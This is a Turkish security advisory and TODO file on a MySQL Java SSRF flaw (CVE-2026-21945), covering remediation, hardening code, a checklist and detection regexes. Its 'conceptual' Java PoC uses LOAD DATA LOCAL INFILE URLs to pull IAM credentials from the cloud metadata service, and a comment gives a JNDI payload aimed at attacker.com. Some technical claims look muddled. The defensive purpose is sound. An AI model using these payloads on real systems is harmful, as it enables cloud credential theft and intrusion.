# TODO: CVE-2026-21945 — Oracle MySQL Java SSRF

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2026-21945 |
| **Kritiklik** | Orta |
| **Kategori Klasoru** | Erisim_Kontrolu/ |
| **Kaynak Arastirma** | [Arastirmalar/Ocak 2026 Güvenlik Açıkları Araştırması.md](../Arastirmalar/Ocak%202026%20G%C3%BCvenlik%20A%C3%A7%C4%B1klar%C4%B1%20Ara%C5%9Ft%C4%B1rmas%C4%B1.md) |
| **Tarih** | 2026-02-02 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda | |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2026-21945, Oracle MySQL ve Java SE bilesenlerinde bulunan bir Server-Side Request Forgery (SSRF) ve potansiyel uzaktan kod yurutme zafiyetidir. MySQL'in Java tabanli yonetim ve uzanti bilesenleri uzerinden, kimlik dogrulanmis bir saldirganin dahili ag kaynaklarina yetkisiz erisim saglamasina ve belirli kosullarda uzaktan kod yurutmesine olanak tanimaktadir. Oracle Ocak 2026 Critical Patch Update (CPU) kapsaminda yamasi yayinlanmistir. Bulut ortamlarinda metadata servislerine (169.254.169.254) erisim saglanarak oturum anahtarlari ve kimlik bilgileri ele gecirilebilir ve bu durum tum bulut altyapisinin kompromize edilmesine yol acabilir.
*   **Etkilenen bilesenler:** Oracle MySQL Server (Java tabanli bilesenleri — MySQL Enterprise Monitor, MySQL Router), Java SE Runtime Environment, Oracle Cloud altyapisi, MySQL Connector/J JDBC surucusu, MySQL kullanan kurumsal uygulamalar

---

### 2. Teknik detay (nasil calisiyor)
*   Oracle MySQL, Java tabanli yonetim araclari (MySQL Enterprise Monitor, MySQL Workbench) ve uzanti bilesenleri (MySQL Router, MySQL Shell) araciligiyla Java SE Runtime Environment ile derin entegrasyona sahiptir. Bu bilesenlerin bazilari, URL tabanli kaynak yuklemesi veya uzak sunucu baglantilarini desteklemektedir.
*   Zafiyet, MySQL'in Java tabanli bir bileseninde (MySQL Enterprise Monitor veya Connector/J uzerinden) kullanicidan alinan bir URL parametresinin yeterince dogrulanmadan sunucu tarafinda HTTP istegine donusturulmesinden kaynaklanmaktadir. Saldirgan, bu parametreye dahili ag adreslerini (orn. http://169.254.169.254/latest/meta-data/ veya http://10.0.0.1:8080/admin) yerlestirerek SSRF tetikler.
*   SSRF araciligiyla saldirgan: (1) dahili ag taramasi yapabilir, (2) bulut metadata servislerinden IAM kimlik bilgileri ve API anahtarlari cikarabilir, (3) dahili servislere (Redis, Elasticsearch, Kubernetes API) yetkisiz istek gonderebilir. Belirli Java RMI veya JNDI baglanti senaryolarinda SSRF, uzaktan kod yurutmeye yukselebilir.
*   Java Naming and Directory Interface (JNDI) uzerinden yonlendirme yapilabiliyorsa, saldirgan LDAP/RMI sunucusuna SSRF istegi gondererek hedef sunucuda Java sinifi yuklenmesini tetikleyebilir (JNDI injection — Log4Shell benzeri vektor).
*   **Neden:** Kok neden, MySQL Java bilesenlerindeki URL isleyicilerinin gelen adresi beyaz liste kontrolu (allowlist) ile dogrulamak yerine, yalnizca basit format kontrolu yapmasi ve dahili ag adreslerini filtrelememesidir. Ayrica Java SecurityManager'in bu bilesenlerde kisitlayici politikalarla yapilandirilmamasi SSRF'in ic aga yayilmasina olanak tanir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** MySQL Enterprise Monitor veya MySQL Connector/J kullanan bir uygulama — kimlik dogrulanmis kullanici erisimi gerektirir
*   **2. Normal durum:**
    ```
    1. Yonetici, MySQL Enterprise Monitor uzerinden sunucu durumunu izler
    2. Monitor, yapik yapilndirmadaki URL'lere istek gondererek metrikleri toplar
    3. Tum istekler yalnizca tanimli ve yetkili hedeflere yapilir
    4. Dahili ag kaynaklarina dogrudan erisim yok
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```java
    // Kavramsal PoC — MySQL SSRF ile dahili ag erisimi ve metadata cikarma
    import java.sql.*;
    import java.net.*;

    public class MySQLSSRFPoC {
        public static void main(String[] args) throws Exception {
            // 1. MySQL sunucusuna baglan (kimlik dogrulamasi gerekli)
            String jdbcUrl = "jdbc:mysql://target-mysql:3306/testdb"
                + "?allowLoadLocalInfile=true"
                + "&allowUrlInLocalInfile=true";
            Connection conn = DriverManager.getConnection(jdbcUrl, "app_user", "password");

            // 2. LOAD DATA LOCAL INFILE ile SSRF tetikle
            // Dosya yolu yerine URL vererek sunucu tarafinda HTTP istegi olustur
            Statement stmt = conn.createStatement();

            // 3. AWS/Azure/GCP metadata servisine SSRF
            stmt.execute("LOAD DATA LOCAL INFILE "
                + "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
                + " INTO TABLE ssrf_output");
            // MySQL sunucusu, bulut metadata servisine HTTP istegi yapar
            // IAM kimlik bilgileri ssrf_output tablosuna yazilir

            // 4. Dahili ag taramasi
            stmt.execute("LOAD DATA LOCAL INFILE "
                + "'http://10.0.0.1:8080/admin'"
                + " INTO TABLE ssrf_output");
            // Dahili yonetim paneline erisim

            // 5. JNDI injection (kod yurutme potansiyeli)
            // jdbc:mysql://target?connectionAttributes=jndi:ldap://attacker.com/exploit
            // Saldirgan LDAP sunucusu uzerinden Java sinifi yukletir
        }
    }
    ```
*   **4. Analiz:** MySQL Connector/J'nin `allowUrlInLocalInfile` parametresi etkin oldugunda, LOAD DATA LOCAL INFILE komutuna verilen dosya yolu bir URL olarak yorumlanir ve MySQL istemcisi (veya sunucusu) bu URL'ye HTTP istegi yapar. Sunucu dahili ag icerisindeyse, SSRF ile normalde disan erisilemeyecek kaynaklara (metadata servisleri, dahili API'ler) erisilebilir. JNDI injection vektoru, Java'nin uzak sinif yukleme mekanizmasini istismar ederek kod yurutmeye yukseltir.
*   **5. Kanit:** Saldirgan, ssrf_output tablosundan bulut metadata servisinin yanitini (IAM credentials, token'lar) okuyabilir. Sunucu ag loglarinda dahili adreslere (169.254.169.254, 10.x.x.x) beklenmeyen HTTP istekleri gorunur. MySQL general_log'da LOAD DATA LOCAL INFILE komutlarinda URL formatinda dosya yollari tespit edilebilir.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Orta
*   **CVSS Skoru:** Oracle tarafindan "Dusuk" olarak siniflandirilmis; ancak bulut ortamlarinda etki Yuksek/Kritik seviyesine cikabilir (metadata credential theft)
*   **Saldiri Yuzeyi:** Ag tabanli (MySQL sunucusuna ag erisimi ve kimlik dogrulama gerektirir; bulut ortamlarinda daha genis etki)
*   **Karmasiklik:** Orta (kimlik dogrulanmis erisim ve belirli JDBC yapilandirma parametreleri gerekir; ancak SSRF teknigi iyi belgelenmis)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Oracle Ocak 2026 Critical Patch Update'i tum MySQL sunucularina ve Java SE kurulumlarına uygulayin. MySQL Connector/J yapilandirmasinda `allowLoadLocalInfile=false` ve `allowUrlInLocalInfile=false` olarak ayarlayin. MySQL kullanici yetkilerinden FILE yetkisini kaldirin. Bulut ortamlarinda Instance Metadata Service v2 (IMDSv2) zorunlulugunu uygulayin.
*   **Orta vadeli:** MySQL sunucularini dahili ag segmentinde izole edin ve yalnizca yetkili uygulamalardan erisime izin verin. SSRF korumalari icin dis ag isteklerini engelleyen egress firewall kurallari uygulayin. MySQL'in Java bilesenlerinde Java SecurityManager'i kisitlayici politikalarla yapilandirin. Veritabani erisimi icin en az yetki prensibini uygulayin — yalnizca SELECT, INSERT, UPDATE, DELETE yetkileri verin.
*   **Uzun vadeli:** MySQL yonetim araclarin ag izolasyonunu mikro-segmentasyon ile pekistirin. SSRF saldirilarini tespit eden WAF/IPS kurallarini veritabani katmanina kadar genisletin. Java JNDI uzak sinif yuklemeyi tamamen devre disi birakin (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Bulut ortamlarinda IMDSv2 zorunlulugu, VPC endpoint politikalari ve Service Control Policies (SCP) ile metadata erisimini sinirlanidirin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```java
// === GUVENSIZ: MySQL JDBC baglantisi — SSRF'e acik yapilandirma ===
import java.sql.*;

public class DatabaseConnection {
    public Connection getConnection() throws SQLException {
        // allowLoadLocalInfile ve allowUrlInLocalInfile acik
        String url = "jdbc:mysql://db-server:3306/appdb"
            + "?allowLoadLocalInfile=true"
            + "&allowUrlInLocalInfile=true";
        return DriverManager.getConnection(url, "app_user", "password");
        // SSRF ve yerel dosya okuma saldirilarına acik
    }
}
```

```sql
-- GUVENSIZ: Kullanicida FILE yetkisi var — SSRF icin kullanilabilir
GRANT FILE ON *.* TO 'app_user'@'%';
GRANT ALL PRIVILEGES ON appdb.* TO 'app_user'@'%';
-- Kullanici, LOAD DATA INFILE ile dosya sistemi ve ag erisimi elde edebilir
```

**Guvenli kod:**
```java
// === GUVENLI: MySQL JDBC baglantisi — SSRF korunmali yapilandirma ===
import java.sql.*;
import java.util.Properties;

public class DatabaseConnection {
    public Connection getConnection() throws SQLException {
        // 1. SSRF ve dosya erisimini devre disi birak
        Properties props = new Properties();
        props.setProperty("user", "app_user");
        props.setProperty("password", getSecurePassword());  // Vault'tan al
        props.setProperty("allowLoadLocalInfile", "false");   // Dosya yukleme kapali
        props.setProperty("allowUrlInLocalInfile", "false");  // URL uzerinden yukleme kapali
        props.setProperty("autoDeserialize", "false");        // Deserialization kapali
        props.setProperty("allowMultiQueries", "false");      // Coklu sorgu kapali

        // 2. SSL/TLS zorunlu
        props.setProperty("useSSL", "true");
        props.setProperty("requireSSL", "true");
        props.setProperty("verifyServerCertificate", "true");

        String url = "jdbc:mysql://db-server:3306/appdb";
        return DriverManager.getConnection(url, props);
    }

    private String getSecurePassword() {
        // Vault veya Secret Manager'dan parola al
        // Asla hard-coded parola kullanma
        return System.getenv("DB_PASSWORD");
    }
}
// Connector/J surumu: 8.4.0+ (yamali surum)
```

```sql
-- GUVENLI: En az yetki prensibi ile kullanici yapilandirmasi
-- FILE yetkisini kaldir
REVOKE FILE ON *.* FROM 'app_user'@'%';
REVOKE SUPER ON *.* FROM 'app_user'@'%';
REVOKE PROCESS ON *.* FROM 'app_user'@'%';

-- Yalnizca gerekli yetkileri ver ve IP kisitlamasi uygula
GRANT SELECT, INSERT, UPDATE, DELETE ON appdb.* TO 'app_user'@'10.0.1.%';

-- LOAD DATA INFILE'i sunucu duzeyinde devre disi birak
-- my.cnf / my.ini dosyasina ekle:
-- [mysqld]
-- local-infile=0
-- bind-address=10.0.1.100
-- skip-name-resolve

-- SSRF icin kullanilabilecek yetkileri denetle
SELECT user, host, File_priv, Super_priv, Process_priv
FROM mysql.user WHERE File_priv = 'Y' OR Super_priv = 'Y';
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Oracle MySQL Server ve Java SE kurulumlarinin envanterini cikar (surum bilgileriyle)
*   [ ] MySQL Connector/J kullanan tum uygulamalarin JDBC yapilandirmasini denetle
*   [ ] MySQL kullanici yetkilerini (FILE, SUPER, PROCESS) kontrol et
*   [ ] Bulut ortamlarindaki MySQL sunucularinda metadata servisi erisim durumunu dogrula

**Duzeltme**
*   [ ] Oracle Ocak 2026 Critical Patch Update'i tum MySQL sunucularina uygula
*   [ ] Connector/J yapilandirmasinda allowLoadLocalInfile ve allowUrlInLocalInfile'i devre disi birak
*   [ ] MySQL kullanici yetkilerinden FILE, SUPER, PROCESS yetkilerini kaldir
*   [ ] my.cnf'de local-infile=0 ve bind-address yapilandirmalarini uygula
*   [ ] Bulut ortamlarinda IMDSv2 zorunlulugunu uygulayin
*   [ ] MySQL sunucularini dahili ag segmentinde izole et

**Dogrulama**
*   [ ] SSRF ile dahili ag erisimi testini yama sonrasi tekrarla
*   [ ] LOAD DATA LOCAL INFILE ile URL formatinda isteklerin engelledigini dogrula
*   [ ] Bulut metadata servisine erisimin engelledigini test et (IMDSv2)
*   [ ] MySQL kullanici yetkilerinin en az yetki prensibine uygun oldugunu dogrula
*   [ ] Egress firewall kurallarinin SSRF isteklerini engelledigini dogrula

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   MySQL general_log'da LOAD DATA LOCAL INFILE komutlarini izle — URL formatinda dosya yollari icin filtrele
    *   MySQL slow_log ve error_log'da beklenmeyen ag baglanti hatalarini izle
    *   Ag izleme cozumlerinde MySQL sunucusundan dahili adreslere (169.254.169.254, 10.x.x.x, 172.16.x.x) HTTP isteklerini tespit et
    *   Regex: `(?i)(LOAD\s+DATA\s+LOCAL\s+INFILE\s+['"]https?://|allowUrlInLocalInfile.*true)`
    *   Regex: `(?i)(169\.254\.169\.254|metadata\.google|metadata\.azure|instance-data)`
    *   Java uygulama loglarinda JNDI lookup hatalarini veya beklenmeyen LDAP/RMI baglantilarini izle
*   **Anomali Tespiti:**
    *   MySQL sunucusundan bulut metadata servisine (169.254.169.254) HTTP istekleri (SSRF belirtisi)
    *   MySQL sunucusundan ic ag adreslerine (10.x, 172.16.x, 192.168.x) beklenmeyen HTTP/HTTPS istekleri
    *   LOAD DATA LOCAL INFILE komutlarinda dosya yolu yerine URL formati kullanilmasi
    *   MySQL kullanicilarin FILE yetkisiyle beklenmeyen dosya okuma/yazma islemleri
    *   Java uygulamalarda beklenmeyen JNDI/LDAP/RMI baglantilari (JNDI injection belirtisi)

---

## Notlar
Oracle Ocak 2026 CPU kapsaminda 337 yeni guvenlik yamasi arasinda ele alinmistir. Tek basina SSRF olarak "Dusuk/Orta" siniflandirilsa da, bulut ortamlarinda metadata credential theft riski nedeniyle gercek etki cok daha yuksektir. CVE-2025-66516 (Apache Tika XXE) ile birlikte Oracle ekosistemindeki tedarik zinciri risklerinin bir ornegir. Java JNDI injection vektoru, Log4Shell (CVE-2021-44228) ile benzer istismar prensiplerine sahiptir.
